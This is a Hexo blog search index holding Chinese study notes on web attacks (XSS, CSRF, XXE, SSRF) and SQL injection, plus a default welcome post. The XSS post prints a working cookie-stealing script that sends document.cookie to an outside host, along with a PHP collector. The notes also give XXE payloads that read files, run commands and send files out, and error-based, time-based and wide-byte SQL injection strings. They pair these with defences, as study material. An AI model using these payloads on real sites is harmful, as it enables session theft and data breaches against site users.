<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F08%2F29%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
  <entry>
    <title><![CDATA[XSS跨站脚本攻击]]></title>
    <url>%2F2019%2F06%2F30%2FXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[JS和AJAX的一些基础1.window.onload()指的是等网页的元素都加载完毕就会执行这段代码如果存在两个onload，那么只会执行后一个 12window.onload = function() &#123; alert(“text1”);&#125;; window.onload = function() &#123; alert(“text2”);&#125;; 2.onreadystatechange 事件：当请求被发送到服务器时，我们需要执行一些基于响应的任务。每当 readyState 改变时，就会触发 onreadystatechange 事件。下面是一个实例： 1234567xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.getElementById("myDiv").innerHTML=xmlhttp.responseText; &#125;&#125; Ajax跨域正常的跨域实现方案1.允许单个域名访问若需要指定某域名(http://client.runoob.com)跨域访问，只需要在(http://server.runoob.com/server.php)文件的头部添加如下代码：header(&#39;Access-Control-Allow-Origin:http://client.runoob.com&#39;); 2.允许多个域名访问在头部文件中添加如下代码： 12345$origin = isset($_SERVER['HTTP_ORIGIN'])? $_SERVER['HTTP_ORIGIN'] : ''; $allow_origin = array( 'http://client1.runoob.com', 'http://client2.runoob.com' ); if(in_array($origin, $allow_origin))&#123; header('Access-Control-Allow-Origin:'.$origin); &#125; 3.允许所有域名访问在头部添加如下代码：header(&#39;Access-Control-Allow-Origin:*&#39;); 利用其他方法实现跨域1.在HTML中对跨域网站请求一些内容，例如图片，JS代码等信息，在请求网站后添加？以及需要传递的信息，从而实现信息的跨域传输。例如&lt;img src=&quot;http://rushrush.com/demo.php?c=xxx&quot;&gt; &lt;script src=&quot;http://rushrush.com/demo.php?c=xxx&quot;&gt;&lt;/script&gt; 存储XSS存储XSS，会把攻击者的数据存储到服务器端，攻击行为将伴随着攻击数据一直存在。一个存储xss攻击的例子，在内容行输入JS脚本，因为JS脚本一般比较长的原因，将src指向其他地方的一个JS文件 下面是该JS文件的源码，可以看到JS脚本通过获取当前网页的cookie并发送到其他服务器来实现窃取Cookie的操作： 123456789101112131415161718192021function xlx()&#123; if(window.navigator.userAgent.indexOf('MSIE')&gt;0)&#123; return new ActiveXObject("Microsoft.XMLHTTP"); &#125;else&#123; return new XMLHttpRequest(); &#125;&#125;var xd = xlx();var data = 'c='+document.cookie;var url = 'http://rushrush.com/demo.php';xd.open('post',url);xd.setRequestHeader('content-type','application/x-www-form-urlencoded');xd.onreadystatechange=function()&#123; if(xd.readyState == 4 &amp;&amp; xd.status == 200)&#123; // document.write(xd.responseText); &#125;&#125;xd.send(data); 另外远端服务器的PHP代码作用是将传输过来的Cookie值存储到本地服务器，这样整个盗取的过程就完整了 12345678910&lt;?phpheader('Access-Control-Allow-Origin:*');$c = empty($_REQUEST['c'])?"":$_REQUEST['c']."\r\n";echo 'hello '.$c;$myfile = fopen("d:/1.txt","a+");fwrite($myfile,$c);fclose($myfile);?&gt; 反射型XSS和存储型CSS不同的是，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。下面是一个攻击的例子： 一下网页在用户键入一个用户名后，会反馈出Hello+用户名 如果在键入的用户名区域输入跨站脚本，则可以和上面的存储型XSS一样，获取到用户的Cookie信息，从而实现攻击，如下图的输入信息就能成功实现攻击 进行反射型XSS的时候，第三者通常会经注入了脚本信息的链接发给用户，用户通过打开该链接被获取Cookie，从而第三方利用获取的Cookie登陆。 DOM型XSS不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。 下面是一个利用DOM-XSS进行攻击的例子：DOM型XSS 在浏览器执行DOM型XSS的时候，由于浏览器的X-XSS-Protection策略，会返回错误信息，并执行失败，如下图所示： 该策略可以通过CRLF绕过，利用的前提是我们能够控制一段参数，也就是POST或者GET的数据，而且这个数据会用在返回包的包头中。通过CRLF注入在返回包头中注入一个X-XSS-Protection:0从而使得浏览器关闭策略拦截，但是该漏洞现在已经很难利用了，因为最新版本的PHP不允许在HTTP表头内出现换行字符(要利用的话PHP版本必须低于5.1)… 另外PHP中执行header(&quot;Location: $a&quot;)可在返回的包头中添加跳转的一行，想要增加其他的包头也同理。 CRLF注入 修补XSS漏洞1.做处理（过滤）可以通过将&gt;和&lt;删除，或者将这两种符号替换成去其他的符号代替 2.转义可以将JS语句转换成HTML实体，可以在PHP中使用htmlentities()语句 闭合XSS代码一般在PHP代码中会增加&lt;textarea&gt;&lt;/textarea&gt;区域，在该区域中用了JS代码会变成普通的文本而无法执行，因此在注入文本的时候会先增加&lt;/textarea&gt;把前面的区域给闭合掉，然后再添加JS脚本的代码 CSRF攻击CSRF攻击和跨站脚本攻击有点类似，他可以通过给用户发送一个链接，然后在该链接中加入某个恶意的脚本，从而利用用户的登陆信息执行某些行为，比如说如下情况： 如果存在一个链接http://blog.sohu.com/manage/entry.do?m=delete&amp;id=126713012这个链接的作用是让博主删除编号为126713012的博客。 攻击者首先在自己的域中构造一个页面：http://www.a.com/csrf.html 其内容为：&lt;img src=&#39;http://blog.sohu.com/manage/entry.do?m=delete&amp;id=126713012&#39; /&gt;博客主通过点击进入攻击者构造的域，会看见一张失效的图片，回头却发现自己的博客被删除了。 目前防御CSRF攻击主要有三种策略：验证HTTP Refer字段；在请求地址中添加token并验证；在HTTP头中自定义属性并验证 XSS蠕虫如果访问一个网站http://www.a.com/1.js会使得用户在某论坛发表一条评论，这条评论也就是&lt;script src=http://www.a.com/1.js&gt;&lt;/script&gt;。这样会使得这个评论迅速扩散开来，每一个看过这个网页的人都会传播这条评论。 XXE攻击XXE实际上就是XML的一个实体注入 XML在外部实体的写法如下： 123456DTD 实例:&lt;!ENTITY writer SYSTEM "http://www.runoob.com/entities.dtd"&gt;&lt;!ENTITY copyright SYSTEM "http://www.runoob.com/entities.dtd"&gt;XML example:&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt; XXE的危害有几种：可以ssrf，读文件和执行命令，扫描端口 可用外部实体读文件，假若一个包的内容为： 123456789101112&lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;!DOCTYPE bbb[ &lt;?ENTITY xs SYSTEM "http://www.a.com/demo.php"&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xs;&lt;/name&gt;&lt;text&gt;222&lt;/text&gt;&lt;/root&gt; 该包的目的是通过外部访问http://www.a.com/demo.php这个网站，然后将访问返回的值赋给&amp;xs 另外可以让服务器使用ftp协议取读取某个地址中的一个文件内容，如果要读取PHP文件，则需要使用PHP协议，例如： 12345678910111213&lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;!DOCTYPE bbb[ &lt;?ENTITY xs SYSTEM "file:///D:/1.txt"&gt;// &lt;?ENTITY xs SYSTEM "php://filter/read=convert.base64-encode/resource=d:/1.php"&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xs;&lt;/name&gt;&lt;text&gt;222&lt;/text&gt;&lt;/root&gt; 还可以通过外部访问来扫描某IP的端口，如： 123456789101112&lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;!DOCTYPE bbb[ &lt;?ENTITY xs SYSTEM "127.0.0.1：1080"&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xs;&lt;/name&gt;&lt;text&gt;222&lt;/text&gt;&lt;/root&gt; 通过判断返回包的信息来判断该端口是否是开放的 对于执行命令的用法，如下代码所示： 123456789101112&lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;!DOCTYPE bbb[ &lt;?ENTITY xs SYSTEM "expect://id"&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xs;&lt;/name&gt;&lt;text&gt;222&lt;/text&gt;&lt;/root&gt; 利用外部实体访问来进行攻击的案例如下：首先攻击者发送一份包含xml实体内容的包给服务器，包的内容如下 12345678&lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;!DOCTYPE bbb[ &lt;?ENTITY %xs SYSTEM "www.a.com/a.dtd"&gt; %xs;]&gt;&lt;root&gt;&amp;xd2;&lt;/root&gt; 下面是a.dtd的内容相当于读取服务器内的一个文件1.txt，并将其发送到了www.a.com域名中： 123&lt;IENTITY %xd SYSTEM "php://filter/read=convert.base64-encode/resource=d:/1.txt"&gt;&lt;IENTITY %demo "&lt;IENTITY xd2 SYSTEM "http://www.a.com/xs.php?i=%xd"&gt;"&gt;%demo; XXE漏洞修补1.使用开发语言提供的”禁用外部实体的方法“PHP：libxml_disable_entity_loader(true);JAVA: 12DocumentBuliderFactory dbf = DocumentBuliderFactory.nerInstance();dbf.setExpandEntityReferences(false); Python: 12from lxml import extreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 2.过滤用户提交的XML数据关键词：&lt;!DOCTYPE和!ENTITY，或者SYSTEM和PUBLUC SSRFSSRF是一种由攻击者构造形成的，由服务器端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（相当于服务器接受客户端所提供的URL，然后服务器代客户端去请求该URL，返回数据给客户端） 用途：扫描端口，读取文件 假如服务器端的PHP文件如下： 123456789&lt;?php$url = empty($_GET['url'])?"":$_GET['url'];if($url!="")&#123; $html = file_get_contents($url,true); echo $html;&#125;else&#123; echo 1;&#125;?&gt; 在请求网站过程中，发送一个网站地址，服务器就会带客户端返回该网站的内容，如果该网站是服务器的内部网站，那么该方式就成功获取了内部网站的内容。并且还能通过服务器扫描内部网下其他服务器的开放端口。 为了避免SSRF攻击，转发的内容尽量在客户端执行，比如说从其他网站请求一张图片显示，服务器端应该返回代码&lt;img src=www.xxx.com/ff.jpg /&gt;，如果是服务器自己先获取到图片再进行转发，则很容易被利用。 探测是否有SSRF漏洞的一种方法，在传入网址端传入ip.cn，若发现IP地址和本机不一样，则说明存在漏洞。]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入总结]]></title>
    <url>%2F2019%2F06%2F27%2FSQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[Mysql的一些基本操作命令创建数据库：create database XXX;查看数据库：show databases;切换数据库：use XXX;删除数据库：drop database XXX; 创建数据表： 123456create table teacher(id int(4) not null primary key auto_increment,name char(20) not null,sex char(10) not null,addr char(20) not null); 查看数据表：show tables插入数据表：insert into teacher(name,sex,addr) values(&#39;leo&#39;,&#39;male&#39;,&#39;hangzhou&#39;);查询数据表：select * from teacher;查看表的结构：desc XX;更新数据：update teacher set name=&quot;X&quot; where id=X;删除数据：delete from teacher where name=&quot;X&quot;;order by用于排序：select information from table order by X ASC/DESC;union可以用来连接两个信息，即增加一项select LIMIT用法：SELECT * FROM table LIMIT offset, rows第一个数字指的是起始行，第二数字指的是获取的行数！ 一些常用的数据库查询命令1.当前数据库的所有表select table_name from information_schema.TABLES where TABLE_SCHEMA=database();2.获取表中的所有列的名字select column_name from information_schema.columns where table_name=&#39;表名&#39; 判断时字符串注入还是整型注入1.当加单引号进行闭合后，会报错或者无内容显示：select * from table where id=3’2.当不用单引号闭合，并且在后面加条件会按照条件的逻辑顺序显示，则判断为整型注入select * from table where id=3 and 1=1不满足以上两点就时字符串注入，其特征有以下几点：1.当用单引号闭合后还是会报错，因为闭合后单引号个数不匹配：select * from table where name=’admin’’2.需要对后面的内容进行注释，注释符号为– (后面有个空格) # 延时注入延时注入主要用于不显示错误信息的情况下对数据库名字，表的名字，列的名字进行显示的一种方法。if(ascii(subtring(&quot;hello&quot;,1,1))=104,sleep(5),0);可以看到，取出”hello”里的第一个字符串，也就是”h”,判断他的ascii码是否为104(“h”的ascii码为104),如果是则延时5秒，反之不延时。同样，我们可以在substring函数里面写SQL语句，提取出我们所要查的表名、列名，再用延时猜解出来。 联合注入首先可以通过order by来试探出总共有多少个字段http://rushrush.com/DVWA/vulnerabilities/sqli/?id=1 order by 1 还可以通过union select查看当前数据库的某些表http://rushrush.com/DVWA/vulnerabilities/sqli/?id=1 union select 1,database(),3 LIMIT 1,1 不过这种情况不适合用于盲注的场景，因为没有输出反馈 别名在查询数据库的时候可以给列的名字取一个别名，以下两张图为示例：下图中用了’as’作为别名显示的字符 其中‘as’可写可不写 Mysql之bug注入利用数据库的BUG进行利用，看输出的报错信息，因为报错的信息中包含了我们想要获取的信息。只要是count(),rand,group by三个连用就会造成BUG报错（一般表中的数据需要三条以上），如下代码select concat(floor(rand(0)*2),(select database())) as x,count(1) from student group by x;就会在报错中显示数据库的名字！ Mysql注入之函数报错有许多函数可以利用，如updatexml, exp, geometrycollection, polygon, multipoint, multilinestring, multipolygon 通过UpdateXml报错，注入语句如下：&amp; 1=(updatexml(1,concat(0x3a,(select user())),1)) 通过exp报错，注入的语句如下：&amp; exp(~(select * from (select user()) a)) 通过GeometryCollection()报错，注入语句如下：&amp; geometrycollection((select * from(select * from(select user())a)b))后两句会因为版本问题失效。。。 Mysql注入的修补对于字符串的修补，在PHP程序中，用addslashes()函数，将符号包括用来闭合的单引号转义，即在符号前面加一个‘\’ 对于int型的数据，可以在获取过程中对其加0，若输入是字符串则会自动转型成int，避免了注入的威胁。因为若输入一个字符串，在转型过程中只会保留第一个数字字符而舍去后面的字符。 还可以通过搜索输入字符串中是否存在像“select””from”等的关键词，将关键词转型，则可以实现注入修补 宽字节注入在前面可以看到，通过用转义来实现对Mysql的修补，然而通过利用宽字节可以实现恢复单引号闭合。 大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。 [宽字符注入详解](https://blog.csdn.net/helloc0de/article/details/76180190 “宽字符”) insert,update,delete注入三者的区别在于其注入的那句程序是insert,update还是delete三者都支持报错注入 insert注入一个insert注入的例子：1.确认是否存在注入2.获取数据库名：or updatexml(&#39;&#39;,concat(0x7e,(SELECT DATABASE())),0x7e) or 3.获取表名：or updatexml(&#39;&#39;,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 2,1)),0x7e) 4.获取字段名：or updatexml(&#39;&#39;,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name=&#39;users&#39; limit 0,1)),0x7e) 5.获取数据or updatexml(&#39;&#39;,concat(0x7e,(SELECT concat_ws(&#39;:&#39;,user_id,first_name,last_name) FROM users limit 0,1)),0x7e) 如果是inset一般要增加右括号，因为根据insert的语句，闭合括号再对口面部分进行注释可以实现注入。 delete注入delete注入部分支持布尔注入和延时注入和报错注入 延时注入的一个语句范例：delete from users where user_id=1 and sleep(if(database()=&#39;dvwa&#39;,5,1));经过上述语句可以用来确定一些信息，而且不会执行delete，即不会删除数据库中的条目 update注入update同理只是将操作数据库的命令变成了update，下面是一个例子：update teacher set name=&quot;Gou&quot; where id=1 and sleep(if(database()=&#39;test&#39;,5,1)); Mysql注入经常用到的函数1.HEX()函数，能够将字符或者数字转成十六进制2.ASCII()函数和ORD()，将字符转成对应ASCII表上的数字，区别在于ord能进行多字节的字符处理3.char()函数，能从数字还原出对应的ASCII码 Mysql注入常用函数]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
</search>
